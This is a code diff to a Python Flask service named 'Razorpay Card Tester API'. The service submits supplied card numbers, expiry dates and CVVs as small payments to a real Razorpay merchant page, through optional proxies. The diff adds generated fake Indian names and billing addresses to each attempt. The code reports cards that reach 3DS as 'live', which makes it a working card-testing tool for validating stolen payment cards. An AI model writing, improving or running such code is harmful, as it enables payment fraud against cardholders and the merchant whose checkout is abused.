@@ -1,7 +1,7 @@
-# app.py - Enhanced redirect extraction for JavaScript redirects
+# app.py - With address generation and filling
 from flask import Flask, request, jsonify
 import requests, re, json, time, random, string, secrets, hashlib, base64, urllib3
-from urllib.parse import quote, urlparse, parse_qs, unquote
+from urllib.parse import quote
 import os
 
 urllib3.disable_warnings()
@@ -12,22 +12,60 @@ app = Flask(__name__)
 URL = "https://pages.razorpay.com/iicdelhi"
 AMO = 10000  # ₹100.00 in paise
 
-# ========== HELPER FUNCTIONS ==========
-def generate_membership_id():
-    return f"MEM{random.randint(10000, 99999)}"
+# ========== ADDRESS DATA ==========
+INDIAN_CITIES = [
+    "Mumbai", "Delhi", "Bangalore", "Hyderabad", "Ahmedabad", 
+    "Chennai", "Kolkata", "Surat", "Pune", "Jaipur", 
+    "Lucknow", "Kanpur", "Nagpur", "Indore", "Thane",
+    "Bhopal", "Visakhapatnam", "Patna", "Vadodara", "Ludhiana"
+]
 
-def generate_member_name():
-    first_names = ["Raj", "Priya", "Amit", "Sneha", "Vikram", "Ananya", "Arjun", "Kavya", "Rohan", "Ishita"]
-    last_names = ["Sharma", "Verma", "Patel", "Kumar", "Singh", "Reddy", "Joshi", "Gupta", "Malhotra", "Mehta"]
-    return f"{random.choice(first_names)} {random.choice(last_names)}"
+INDIAN_STATES = {
+    "MH": "Maharashtra", "DL": "Delhi", "KA": "Karnataka", "TG": "Telangana",
+    "GJ": "Gujarat", "TN": "Tamil Nadu", "WB": "West Bengal", "RJ": "Rajasthan",
+    "UP": "Uttar Pradesh", "MP": "Madhya Pradesh", "BR": "Bihar", "PB": "Punjab"
+}
 
-def generate_email():
-    domains = ["gmail.com", "yahoo.com", "outlook.com", "protonmail.com", "icloud.com"]
-    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
-    return f"{username}@{random.choice(domains)}"
+INDIAN_PINCODES = [
+    "400001", "110001", "560001", "500001", "380001", 
+    "600001", "700001", "395001", "411001", "302001",
+    "226001", "208001", "440001", "452001", "400601",
+    "462001", "530001", "800001", "390001", "141001"
+]
 
-def generate_phone():
-    return f"+91{random.randint(7000000000, 9999999999)}"
+INDIAN_NAMES = [
+    "Raj Sharma", "Priya Patel", "Amit Kumar", "Sneha Reddy", "Vikram Singh",
+    "Ananya Mehta", "Arjun Joshi", "Kavya Gupta", "Rohan Malhotra", "Ishita Verma",
+    "Manish Yadav", "Neha Agarwal", "Suresh Nair", "Deepika Rao", "Rahul Khanna"
+]
+
+def generate_address():
+    """Generate random Indian address"""
+    city = random.choice(INDIAN_CITIES)
+    state_code = random.choice(list(INDIAN_STATES.keys()))
+    state = INDIAN_STATES[state_code]
+    pincode = random.choice(INDIAN_PINCODES)
+    
+    # Generate street address
+    street_types = ["Street", "Road", "Lane", "Avenue", "Boulevard", "Colony", "Nagar", "Vihar"]
+    street_names = ["MG", "Park", "Lake", "Hill", "Garden", "Sunset", "Green", "Rose", "Lotus", "Golden"]
+    house_numbers = [str(random.randint(1, 999)) + random.choice(["A", "B", "C", ""]) for _ in range(1)]
+    
+    address_line1 = f"{random.choice(house_numbers)}, {random.choice(street_names)} {random.choice(street_types)}"
+    address_line2 = f"{random.choice(['Near', 'Opposite'])} {random.choice(['Park', 'Mall', 'Temple', 'School', 'Hospital'])}"
+    
+    return {
+        "address_line1": address_line1,
+        "address_line2": address_line2,
+        "city": city,
+        "state": state,
+        "state_code": state_code,
+        "pincode": pincode,
+        "country": "IN"
+    }
+
+def generate_cardholder_name():
+    return random.choice(INDIAN_NAMES)
 
 def get_card_brand(card_number):
     if card_number.startswith("4"): return "visa"
@@ -45,89 +83,6 @@ def find_between(content, start, end):
         return content[s:e]
     except ValueError:
         return ""
-
-def extract_all_redirects(html_content):
-    """Extract ALL possible redirect URLs from HTML"""
-    redirects = []
-    
-    # Pattern 1: window.location.href
-    patterns = [
-        r'window\.location\.href\s*=\s*["\']([^"\']+)["\']',
-        r'window\.location\.replace\s*\(["\']([^"\']+)["\']\)',
-        r'window\.location\.assign\s*\(["\']([^"\']+)["\']\)',
-        r'location\.href\s*=\s*["\']([^"\']+)["\']',
-        r'document\.location\s*=\s*["\']([^"\']+)["\']',
-        r'top\.location\s*=\s*["\']([^"\']+)["\']',
-        r'parent\.location\s*=\s*["\']([^"\']+)["\']',
-        r'self\.location\s*=\s*["\']([^"\']+)["\']',
-        r'window\.location\.pathname\s*=\s*["\']([^"\']+)["\']',
-    ]
-    
-    for pattern in patterns:
-        matches = re.findall(pattern, html_content, re.IGNORECASE)
-        for match in matches:
-            if match.startswith('http') or match.startswith('/'):
-                redirects.append(match)
-    
-    # Pattern 2: Meta refresh
-    meta_matches = re.findall(r'<meta\s+http-equiv=["\']refresh["\']\s+content=["\'][^"\']*url=([^"\']+)["\']', html_content, re.IGNORECASE)
-    redirects.extend(meta_matches)
-    
-    # Pattern 3: Form action
-    form_matches = re.findall(r'<form[^>]+action=["\']([^"\']+)["\']', html_content, re.IGNORECASE)
-    redirects.extend(form_matches)
-    
-    # Pattern 4: Iframe src
-    iframe_matches = re.findall(r'<iframe[^>]+src=["\']([^"\']+)["\']', html_content, re.IGNORECASE)
-    redirects.extend(iframe_matches)
-    
-    # Pattern 5: JavaScript variables
-    var_patterns = [
-        r'var\s+redirectUrl\s*=\s*["\']([^"\']+)["\']',
-        r'var\s+redirectURL\s*=\s*["\']([^"\']+)["\']',
-        r'var\s+url\s*=\s*["\']([^"\']+)["\']',
-        r'var\s+redirect_uri\s*=\s*["\']([^"\']+)["\']',
-        r'let\s+redirectUrl\s*=\s*["\']([^"\']+)["\']',
-        r'const\s+redirectUrl\s*=\s*["\']([^"\']+)["\']',
-        r'redirect_url\s*[:=]\s*["\']([^"\']+)["\']',
-        r'redirect_uri\s*[:=]\s*["\']([^"\']+)["\']',
-    ]
-    
-    for pattern in var_patterns:
-        matches = re.findall(pattern, html_content, re.IGNORECASE)
-        for match in matches:
-            if match.startswith('http') or match.startswith('/'):
-                redirects.append(match)
-    
-    # Pattern 6: Any URL with payment/3ds/auth in it
-    url_pattern = re.compile(r'https?://[^\s"\'<>(){}[\]]+')
-    urls = url_pattern.findall(html_content)
-    
-    for url in urls:
-        # Skip Razorpay/CDN/Google/Fonts
-        if any(skip in url.lower() for skip in ['razorpay', 'cdn', 'google', 'font', 'gstatic', 'cloudflare', 'pages.razorpay']):
-            continue
-        # Look for payment/3ds/auth related URLs
-        if any(key in url.lower() for key in ['3ds', 'acs', 'auth', 'payment', 'bank', 'secure', 'verify', 'otp']):
-            redirects.append(url)
-    
-    # Pattern 7: Look for redirect in JSON-like data
-    json_redirect = re.search(r'"redirect_url"\s*:\s*"([^"]+)"', html_content, re.IGNORECASE)
-    if json_redirect:
-        redirects.append(json_redirect.group(1))
-    
-    # Clean up and deduplicate
-    clean_redirects = []
-    for r in redirects:
-        # Decode HTML entities
-        r = r.replace('&amp;', '&').replace('&#39;', "'").replace('&quot;', '"')
-        # Make sure it's a full URL
-        if r.startswith('/'):
-            r = 'https://api.razorpay.com' + r
-        if r.startswith('http') and r not in clean_redirects:
-            clean_redirects.append(r)
-    
-    return clean_redirects
 
 def parse_proxy(proxy_string):
     if not proxy_string:
@@ -148,12 +103,23 @@ def test_card_on_razorpay(cc, mm, yy, cvv, proxy_string=None):
         "raw_json": None,
         "card": f"{cc[:6]}******{cc[-4:]}",
         "redirect_url": None,
-        "all_redirects": []
+        "address_used": None
     }
     
     try:
-        MEMBERSHIP_ID = generate_membership_id()
-        MEMBER_NAME = generate_member_name()
+        # Generate address and cardholder name
+        address = generate_address()
+        cardholder_name = generate_cardholder_name()
+        
+        result["address_used"] = {
+            "name": cardholder_name,
+            "address": address
+        }
+        
+        print(f"📍 Address generated: {cardholder_name}, {address['address_line1']}, {address['city']}")
+        
+        # Generate other data
+        MEMBERSHIP_ID = f"MEM{random.randint(10000, 99999)}"
         EMAIL = generate_email()
         PHONE = generate_phone()
         
@@ -204,9 +170,10 @@ def test_card_on_razorpay(cc, mm, yy, cvv, proxy_string=None):
             'line_items': [{'payment_page_item_id': ppid, 'amount': AMO}],
             'notes': {
                 'membership_id': MEMBERSHIP_ID,
-                'member_name': MEMBER_NAME,
+                'member_name': cardholder_name,
                 'email': EMAIL,
                 'contact_number': PHONE,
+                'address': f"{address['address_line1']}, {address['address_line2']}, {address['city']}, {address['state']} - {address['pincode']}"
             },
         }
         
@@ -297,7 +264,7 @@ def test_card_on_razorpay(cc, mm, yy, cvv, proxy_string=None):
             timeout=30
         )
         
-        # STEP 5: Cross border flows - capture the currency_request_id
+        # STEP 5: Cross border flows
         headers_cb = {
             "Accept": "*/*", 
             "Content-type": "application/json", 
@@ -315,27 +282,14 @@ def test_card_on_razorpay(cc, mm, yy, cvv, proxy_string=None):
             },
             "forex_charges": {"amount": AMO, "currency": "INR", "filters": {"method": "card"}}
         }
-        resp_cb = session.post(
+        session.post(
             f"https://api.razorpay.com/payments_cross_border_live/v1/checkout/cb_flows?x_entity_id={order_id}&keyless_header={keyless_header_url}", 
             headers=headers_cb, 
             json=payload_cb, 
             timeout=30
         )
         
-        # Extract currency_request_id
-        currency_request_id = None
-        try:
-            cb_data = resp_cb.json()
-            currency_request_id = (
-                cb_data.get('currency_request_id') or 
-                cb_data.get('data', {}).get('currency_request_id') or
-                cb_data.get('id') or
-                cb_data.get('request_id')
-            )
-        except:
-            pass
-        
-        # STEP 6: Create payment
+        # STEP 6: Create payment - WITH ADDRESS FIELDS
         headers_create = {
             'Accept': '*/*', 
             'Content-type': 'application/x-www-form-urlencoded', 
@@ -360,7 +314,7 @@ def test_card_on_razorpay(cc, mm, yy, cvv, proxy_string=None):
             'notes[comment]': '', 
             'notes[email]': EMAIL,
             'notes[phone]': PHONE[3:], 
-            'notes[name]': MEMBER_NAME,
+            'notes[name]': cardholder_name,
             'payment_link_id': plink, 
             'key_id': kyid,
             'contact': PHONE, 
@@ -389,15 +343,19 @@ def test_card_on_razorpay(cc, mm, yy, cvv, proxy_string=None):
             'method': 'card', 
             'card[number]': cc,
             'card[cvv]': cvv, 
-            'card[name]': MEMBER_NAME,
+            'card[name]': cardholder_name,
             'card[expiry_month]': mm, 
             'card[expiry_year]': year_full,
+            'card[address_line1]': address['address_line1'],
+            'card[address_line2]': address['address_line2'],
+            'card[address_city]': address['city'],
+            'card[address_state]': address['state'],
+            'card[address_zip]': address['pincode'],
+            'card[address_country]': address['country'],
             'save': '0',
         }
         
-        if currency_request_id:
-            data_create['currency_request_id'] = currency_request_id
-            data_create['dcc_currency'] = 'INR'
+        print(f"💳 Sending address: {address['address_line1']}, {address['city']}, {address['state']} - {address['pincode']}")
         
         resp_create = session.post(
             'https://api.razorpay.com/v1/standard_checkout/payments/create/checkout',
@@ -408,12 +366,12 @@ def test_card_on_razorpay(cc, mm, yy, cvv, proxy_string=None):
             timeout=30
         )
         
-        # STEP 7: Parse response - ENHANCED for redirects
+        # STEP 7: Parse response
         result["raw_json"] = {}
         
         # Check if it's HTML
         if 'text/html' in resp_create.headers.get('Content-Type', ''):
-            # First, check if there's an error in the HTML
+            # Extract error from HTML
             error_match = re.search(r'var data = ({.*?});', resp_create.text, re.DOTALL)
             if error_match:
                 try:
@@ -422,34 +380,19 @@ def test_card_on_razorpay(cc, mm, yy, cvv, proxy_string=None):
                         result["status"] = "declined"
                         result["message"] = f"Payment declined: {error_data['error'].get('description', 'Unknown error')}"
                         result["raw_json"] = error_data
-                        # Still try to extract redirects even if there's an error
-                        all_redirects = extract_all_redirects(resp_create.text)
-                        if all_redirects:
-                            result["all_redirects"] = all_redirects
-                            result["redirect_url"] = all_redirects[0]
                         return result
                 except:
                     pass
             
-            # Extract ALL redirects from HTML
-            all_redirects = extract_all_redirects(resp_create.text)
-            
-            if all_redirects:
+            # Check for "Proceed" button or redirect
+            if 'proceed-btn' in resp_create.text or 'Click here to proceed' in resp_create.text:
                 result["status"] = "3ds_required"
-                result["message"] = "3DS authentication required - card is live"
-                result["redirect_url"] = all_redirects[0]
-                result["all_redirects"] = all_redirects
-                result["raw_json"] = {
-                    "redirect": True, 
-                    "message": "3DS OTP required",
-                    "redirect_url": all_redirects[0],
-                    "all_redirects": all_redirects
-                }
+                result["message"] = "3DS authentication required - click the link to proceed"
+                result["raw_json"] = {"redirect": True, "message": "3DS OTP required"}
                 return result
             
-            # If no redirects found but it's HTML, treat as unknown
             result["status"] = "unknown"
-            result["message"] = "HTML response received but no redirect found"
+            result["message"] = "HTML response received"
             result["raw_json"] = {"html_preview": resp_create.text[:500]}
             return result
         
@@ -479,12 +422,6 @@ def test_card_on_razorpay(cc, mm, yy, cvv, proxy_string=None):
             if pay_json.get("redirect") is True or pay_json.get("type") == "redirect":
                 result["status"] = "3ds_required"
                 result["message"] = "3DS authentication required"
-                if pay_json.get("request", {}).get("url"):
-                    result["redirect_url"] = pay_json["request"]["url"]
-                    result["raw_json"]["redirect_url"] = pay_json["request"]["url"]
-                elif pay_json.get("url"):
-                    result["redirect_url"] = pay_json["url"]
-                    result["raw_json"]["redirect_url"] = pay_json["url"]
                 return result
             
             result["status"] = "unknown"
@@ -494,12 +431,6 @@ def test_card_on_razorpay(cc, mm, yy, cvv, proxy_string=None):
             result["status"] = "unknown"
             result["message"] = "Non-JSON response received"
             result["raw_json"] = {"raw_response": resp_create.text[:500]}
-            
-            # Try to extract redirects from raw text anyway
-            all_redirects = extract_all_redirects(resp_create.text)
-            if all_redirects:
-                result["redirect_url"] = all_redirects[0]
-                result["all_redirects"] = all_redirects
         
         return result
         
@@ -509,12 +440,20 @@ def test_card_on_razorpay(cc, mm, yy, cvv, proxy_string=None):
         result["raw_json"] = {"error": str(e)}
         return result
 
+def generate_email():
+    domains = ["gmail.com", "yahoo.com", "outlook.com", "protonmail.com", "icloud.com"]
+    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
+    return f"{username}@{random.choice(domains)}"
+
+def generate_phone():
+    return f"+91{random.randint(7000000000, 9999999999)}"
+
 # ========== FLASK API ENDPOINTS ==========
 @app.route('/', methods=['GET'])
 def home():
     return jsonify({
         "service": "Razorpay Card Tester API",
-        "version": "1.6",
+        "version": "1.8",
         "endpoints": {
             "test": "/test?cc=xxxx|mm|yy|cvv&site=url&proxy=host:port:user:pass"
         },
